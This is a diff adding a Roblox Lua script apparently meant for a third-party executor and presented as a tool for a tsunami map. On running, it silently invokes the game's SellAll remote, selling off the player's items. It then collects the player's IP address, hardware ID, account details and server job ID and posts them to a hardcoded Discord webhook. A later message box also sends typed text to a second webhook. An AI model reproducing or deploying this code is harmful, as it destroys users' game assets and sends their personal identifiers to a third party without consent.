@@ -1,0 +1,317 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local bannedUsers = {
+    "SLS25KRAR",
+    "mohmd_robox",
+    "OLKT2",
+    "superez710",
+-----------------------------------------------------------------------------
+    "Karrar123506Jess",
+    "KR23399",
+    "SLS25KR",
+-----------------------------------------------------------------------------
+    "AGLIH1"
+}
+local function isBanned(username)
+    for _, user in ipairs(bannedUsers) do
+        if user == username then
+            return true
+        end
+    end
+    return false
+end
+if isBanned(LocalPlayer.Name) then
+    LocalPlayer:Kick("يابه هل سكربت يحذف كل غراضك بماب تسونامي دير بالك | تحيات خيك محمد")
+end
+wait(1)
+local allowedPlaceId = 131623223084840
+if game.PlaceId ~= allowedPlaceId then
+local Sound = Instance.new("Sound", game:GetService("SoundService"))
+Sound.SoundId = "rbxassetid://3779045779"
+Sound:Play()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "MapBlockerGui"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 360, 0, 180)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 15)
+uicorner.Parent = frame
+local uistroke = Instance.new("UIStroke")
+uistroke.Color = Color3.fromRGB(120, 120, 120)
+uistroke.Thickness = 2
+uistroke.Parent = frame
+local shadowLabel = Instance.new("TextLabel")
+shadowLabel.Size = UDim2.new(1, -30, 0.6, -20)
+shadowLabel.Position = UDim2.new(0, 17, 0, 17)
+shadowLabel.Text = "بس لماب التسونامي ~ only for Escape the brainrot for tsunami"
+shadowLabel.TextColor3 = Color3.fromRGB(15, 15, 15)
+shadowLabel.TextWrapped = true
+shadowLabel.TextScaled = true
+shadowLabel.BackgroundTransparency = 1
+shadowLabel.Font = Enum.Font.GothamBold
+shadowLabel.Parent = frame
+shadowLabel.ZIndex = 1
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -30, 0.6, -20)
+label.Position = UDim2.new(0, 15, 0, 15)
+label.Text = "بس لماب التسونامي ~ only for Escape the brainrot for tsunami"
+label.TextColor3 = Color3.fromRGB(240, 240, 240)
+label.TextWrapped = true
+label.TextScaled = true
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.GothamBold
+label.Parent = frame
+label.ZIndex = 2
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.5, 0, 0.25, 0)
+button.Position = UDim2.new(0.25, 0, 0.7, 0)
+button.Text = "اك | ok"
+button.TextScaled = true
+button.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.AutoButtonColor = true
+button.Parent = frame
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 10)
+btnCorner.Parent = button
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://131527130925065"
+sound.Volume = 0.7
+sound.Parent = button
+button.MouseButton1Click:Connect(function()
+    sound:Play()
+    wait(0.3)
+    gui:Destroy()
+end)
+    return
+end
+wait(1)
+game:GetService("ReplicatedStorage").RemoteFunctions.SellAll:InvokeServer()
+wait(0.5)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Unsupported"
+    return executor
+end
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    local data = {
+        ["avatar_url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "[Player Info](https://www.roblox.com/users/%d)" ..
+                    " \nDisplay Name: %s \nUsername: %s \nUser Id: %d\nMembershipType: %s" ..
+                    "\nAccountAge: %d\nCountry: %s\nIP: %s\nHwid: %s\nDate: %s\nTime: %s" ..
+                    "\n\n[Game Info](https://www.roblox.com/games/%d)" ..
+                    "\nGame: %s \nGame Id: %d \nExploit: %s" ..
+                    "\n\nData:%s``\n\nJobId:%s``",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://media.discordapp.net/attachments/1297939117195133009/1297968199475663028/1729526657294.png?ex=6717da95&is=67168915&hm=f08748e46335cd4ac1e5f368435bd9ed6fc5c42ddd8b4ff5dbab126b84c86850&"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+local webhookUrl = "https://discord.com/api/webhooks/1487416926329114634/NITnTSZhYBfdFKe87sN-SaxURMDhPKjJeHn3R6F1W_5SgtitCUDDLZijxWuY1hSEt0ZE"
+local webhookData = createWebhookData()
+wait(0.5)
+sendWebhook(webhookUrl, webhookData)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local webhookUrl = "https://discord.com/api/webhooks/1487423952585494693/Y5FGPBMqrgp0yxY1ss8sRwelxIwQ2rDg3Gw7RJY7571NyDRTHWz9Km6yqEsI7TtzFSIv"
+local currentText = ""
+local lastSentTime = 0
+local cooldownDuration = 30 * 60
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.CoreGui
+gui.ResetOnSpawn = false
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 320, 0, 210)
+frame.Position = UDim2.new(0.5, -160, 0.5, -105)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+local gradient = Instance.new("UIGradient", frame)
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(30,30,30)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,10))
+}
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 45)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Text = "ماهو شعورك؟\nWhat is your feeling?"
+title.Parent = frame
+local textbox = Instance.new("TextBox")
+textbox.Size = UDim2.new(0.85, 0, 0, 45)
+textbox.Position = UDim2.new(0.075, 0, 0.3, 0)
+textbox.BackgroundColor3 = Color3.fromRGB(35,35,35)
+textbox.TextColor3 = Color3.fromRGB(255,255,255)
+textbox.PlaceholderText = "اكتب هنا..."
+textbox.ClearTextOnFocus = true
+textbox.Font = Enum.Font.Gotham
+textbox.TextSize = 14
+textbox.Parent = frame
+Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 8)
+textbox:GetPropertyChangedSignal("Text"):Connect(function()
+	currentText = textbox.Text
+end)
+local note = Instance.new("TextLabel")
+note.Size = UDim2.new(1, 0, 0, 30)
+note.Position = UDim2.new(0, 0, 0.58, 0)
+note.BackgroundTransparency = 1
+note.TextColor3 = Color3.fromRGB(180,180,180)
+note.TextScaled = true
+note.Font = Enum.Font.Gotham
+note.Text = "الرسائل حقيقية وترسل\nMessages are real and will be sent"
+note.Parent = frame
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.6, 0, 0, 45)
+button.Position = UDim2.new(0.2, 0, 0.78, 0)
+button.BackgroundColor3 = Color3.fromRGB(70,70,70)
+button.TextColor3 = Color3.fromRGB(255,255,255)
+button.Text = "ارسال / Send"
+button.Font = Enum.Font.GothamBold
+button.TextSize = 16
+button.Parent = frame
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
+button.MouseEnter:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(100,100,100)
+	}):Play()
+end)
+button.MouseLeave:Connect(function()
+	TweenService:Create(button, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(70,70,70)
+	}):Play()
+end)
+local function clickEffect()
+	local tween = TweenService:Create(button, TweenInfo.new(0.1), {
+		Size = UDim2.new(0.55, 0, 0, 40)
+	})
+	tween:Play()
+	tween.Completed:Wait()
+	TweenService:Create(button, TweenInfo.new(0.1), {
+		Size = UDim2.new(0.6, 0, 0, 45)
+	}):Play()
+end
+local function createComplaintData(text)
+	local data = {
+		embeds = {{
+			title = "New message!",
+			color = 0x00FFAA,
+			fields = {
+				{name = "Player Name", value = player.Name, inline = true},
+				{name = "Player Id", value = tostring(player.UserId), inline = true},
+				{name = "Message", value = text, inline = false},
+				{name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
+			}
+		}}
+	}
+	return HttpService:JSONEncode(data)
+end
+local function sendWebhook(data)
+	local requestFunc = http_request or request or syn.request
+	if not requestFunc then return false end
+	local success = pcall(function()
+		requestFunc({
+			Url = webhookUrl,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = data
+		})
+	end)
+	return success
+end
+button.MouseButton1Click:Connect(function()
+	clickEffect()
+	local currentTime = os.time()
+	if currentTime - lastSentTime < cooldownDuration then
+game.StarterGui:SetCore("SendNotification", {
+    Title = "انتظر | Wait";
+    Text = "لازم تنتظر قبل ترسل مرة ثانية | You need to wait before sending again";
+    Duration = 3;
+})
+return
+end
+if currentText ~= "" then
+    local data = createComplaintData(currentText)
+    if sendWebhook(data) then
+        lastSentTime = os.time()
+        textbox.Text = ""
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "نجاح | Success";
+            Text = "تم ارسال الرسالة | Message sent successfully";
+            Duration = 3;
+        })
+    else
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "خطأ | Error";
+            Text = "فشل الارسال | Failed to send";
+            Duration = 3;
+        })
+    end
+else
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "خطأ | Error";
+        Text = "اكتب رسالة اول | Write a message first";
+        Duration = 3;
+    })
+end
+end)
